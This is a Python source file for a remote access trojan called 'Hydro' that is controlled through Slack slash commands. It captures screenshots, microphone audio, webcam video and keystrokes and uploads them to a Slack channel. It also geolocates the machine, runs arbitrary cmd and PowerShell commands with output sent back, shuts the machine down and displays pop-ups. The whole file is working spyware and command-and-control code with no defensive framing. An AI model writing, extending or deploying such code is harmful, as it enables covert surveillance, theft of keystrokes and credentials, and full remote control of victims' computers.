import slack_sdk
import pyautogui
import os
from pathlib import Path
from flask import Flask, request, jsonify
import sounddevice as sd
import scipy.io.wavfile as wav
import cv2
import time
import requests
import ctypes
import subprocess
from pynput.keyboard import Listener
import threading

client = slack_sdk.WebClient(token="[TOKEN]")
signing_secret = "[SIGNING_SECRET]"
app = Flask(__name__)

log_file = "key_log.txt"
keylogger_running = False

def take_screenshot():
    screenshot_path = "screenshot.png"
    pyautogui.screenshot(screenshot_path)
    return screenshot_path

def upload_screenshot(channel='C07R8V9JVJ6'):
    screenshot_path = take_screenshot()
    try:
        response = client.files_upload_v2(
            channels=channel,
            file=screenshot_path,
            title="Screenshot",
            initial_comment="Screenshot Uploaded Successfully:"
        )
        print("Screenshot uploaded successfully!")
    except slack_sdk.errors.SlackApiError as e:
        client.chat_postMessage(channel=channel, text="Error uploading screenshot...")
        print(f"Error uploading screenshot: {e.response['error']}")
    finally:
        os.remove(screenshot_path)

def record_audio(duration=120):
    fs = 44100
    print("Recording started...")
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    audio_path = "audio.wav"
    wav.write(audio_path, fs, recording)
    print(f"Recording saved as {audio_path}")
    return audio_path

def upload_audio(channel='C07R8V9JVJ6'):
    audio_path = record_audio()
    try:
        response = client.files_upload_v2(
            channels=channel,
            file=audio_path,
            title="Audio Recording",
            initial_comment="Audio uploaded successfully!"
        )
        print("Audio uploaded successfully!")
    except slack_sdk.errors.SlackApiError as e:
        client.chat_postMessage(channel=channel, text="Error uploading audio...")
        print(f"Error uploading audio: {e.response['error']}")
    finally:
        os.remove(audio_path)

def record_webcam_video(filename='webcam.mp4', duration=120):
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
    start_time = time.time()
    while int(time.time() - start_time) < duration:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
        else:
            break
    cap.release()
    out.release()
    cv2.destroyAllWindows()
    return filename

def upload_webcam_video(channel='C07R8V9JVJ6'):
    video_path = record_webcam_video()
    try:
        response = client.files_upload_v2(
            channels=channel,
            file=video_path,
            title="Webcam Recording",
            initial_comment="Webcam video uploaded successfully!"
        )
        print("Webcam video uploaded successfully!")
    except slack_sdk.errors.SlackApiError as e:
        client.chat_postMessage(channel=channel, text="Error uploading webcam video...")
        print(f"Error uploading webcam video: {e.response['error']}")
    finally:
        os.remove(video_path)

def shutdown_machine():
    os.system("shutdown /s /t 1")

def get_location():
    try:
        ip_info = requests.get("https://api.ipify.org?format=json").json()
        ip = ip_info["ip"]
        response = requests.get(f"https://ipinfo.io/{ip}/json").json()
        location_data = {
            "IP": response.get("ip"),
            "City": response.get("city"),
            "Region": response.get("region"),
            "Country": response.get("country"),
            "Location": response.get("loc"),
        }
        return location_data
    except Exception as e:
        return {"error": str(e)}

def notify(message):
    ctypes.windll.user32.MessageBoxW(0, message, "Notification", 1)

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" {key} ")

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def send_log(channel_id):
    if os.path.exists(log_file):
        with open(log_file, "r") as f:
            logs = f.read()
        client.chat_postMessage(channel=channel_id, text=f"Keylogger logs:\n{logs}")
        open(log_file, "w").close()

def start_log_sending(channel_id, interval=60):
    def send_periodically():
        while keylogger_running:
            send_log(channel_id)
            time.sleep(interval)
    sender_thread = threading.Thread(target=send_periodically)
    sender_thread.start()

def stop_keylogger():
    global keylogger_running
    keylogger_running = False

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return str(e)

@app.route('/screenshot', methods=['POST'])
def handle_screenshot_command():
    channel_id = request.form.get('channel_id')
    upload_screenshot(channel_id)
    return jsonify({"response_type": "ephemeral", "text": "Taking a screenshot..."})

@app.route('/audio', methods=['POST'])
def handle_record_command():
    channel_id = request.form.get('channel_id')
    upload_audio(channel_id)
    return jsonify({"response_type": "ephemeral", "text": "Recording audio..."})

@app.route('/webcam', methods=['POST'])
def handle_webcam_command():
    channel_id = request.form.get('channel_id')
    upload_webcam_video(channel_id)
    return jsonify({"response_type": "ephemeral", "text": "Recording webcam video..."})

@app.route('/shutdown', methods=['POST'])
def handle_shutdown_command():
    channel_id = request.form.get('channel_id')
    shutdown_machine()
    client.chat_postMessage(channel=channel_id, text="Shutting down the machine.")
    return jsonify({"response_type": "ephemeral", "text": "Shutting down..."})

@app.route('/locate', methods=['POST'])
def handle_locate_command():
    channel_id = request.form.get('channel_id')
    location_data = get_location()
    if "error" in location_data:
        client.chat_postMessage(channel=channel_id, text="Error Getting Location.")
    else:
        client.chat_postMessage(
            channel=channel_id,
            text=f"IP: {location_data['IP']}, City: {location_data['City']}, Region: {location_data['Region']}, Country: {location_data['Country']}, Coordinates: {location_data['Location']}"
        )
    return jsonify({"response_type": "ephemeral", "text": "Getting Location..."})

@app.route('/notify', methods=['POST'])
def handle_notify_command():
    channel_id = request.form.get('channel_id')
    message = request.form.get('text')
    if message:
        notify(message)
        client.chat_postMessage(channel=channel_id, text="Notification displayed.")
    else:
        client.chat_postMessage(channel=channel_id, text="No message provided for notification.")
    return jsonify({"response_type": "ephemeral", "text": "Displaying notification..."})

@app.route('/keylogger-on', methods=['POST'])
def handle_keylogger_on_command():
    channel_id = request.form.get('channel_id')
    global keylogger_running
    keylogger_running = True
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()
    start_log_sending(channel_id)
    return jsonify({"response_type": "ephemeral", "text": "Keylogger started."})

@app.route('/keylogger-off', methods=['POST'])
def handle_keylogger_off_command():
    stop_keylogger()
    return jsonify({"response_type": "ephemeral", "text": "Keylogger stopped."})

@app.route('/cmd', methods=['POST'])
def handle_cmd_command():
    channel_id = request.form.get('channel_id')
    command = request.form.get('text')
    if command:
        output = execute_command(command)
        client.chat_postMessage(channel=channel_id, text=f"Command Output:\n{output}")
    else:
        client.chat_postMessage(channel=channel_id, text="No command provided.")
    return jsonify({"response_type": "ephemeral", "text": "Executing command..."})

@app.route('/ps', methods=['POST'])
def handle_ps_command():
    channel_id = request.form.get('channel_id')
    ps_command = request.form.get('text')

    if ps_command:
        try:
            result = subprocess.run(['powershell', '-Command', ps_command], capture_output=True, text=True, shell=True)
            ps_output = result.stdout if result.stdout else result.stderr

            if ps_output:
                client.chat_postMessage(channel=channel_id, text=f"PowerShell Output:\n```\n{ps_output}\n```")
            else:
                client.chat_postMessage(channel=channel_id, text="No output from PowerShell command.")
        except Exception as e:
            client.chat_postMessage(channel=channel_id, text=f"Error running PowerShell command: {str(e)}")
    else:
        client.chat_postMessage(channel=channel_id, text="No PowerShell command provided.")

    return jsonify({"response_type": "ephemeral", "text": "Running PowerShell command..."})

@app.route('/help', methods=['POST'])
def handle_usage_command():
    channel_id = request.form.get('channel_id')
    usage_message = "Usage of Hydro:\n\n" \
                   "/screenshot - Take a screenshot and upload it.\n" \
                   "/audio - Record audio for 2 minutes and upload it.\n" \
                   "/webcam - Record webcam video for 2 minutes and upload it.\n" \
                   "/shutdown - Shutdown the machine.\n" \
                   "/locate - Get the location of the machine.\n" \
                   "/notify <message> - Show a notification with the given message.\n" \
                   "/keylogger-on - Start logging keystrokes.\n" \
                   "/keylogger-off - Stop logging keystrokes.\n" \
                   "/cmd <command> - Execute a command and return the output.\n" \
                   "/ps <powershell command> - Execute a PowerShell command and return the output.\n" \
                   "/download <file_path> - Upload a specified file to Slack.\n" \
                   "/usage - Show this usage information."
    client.chat_postMessage(channel=channel_id, text=usage_message)
    

if __name__ == "__main__":
    app.run(port=5000)
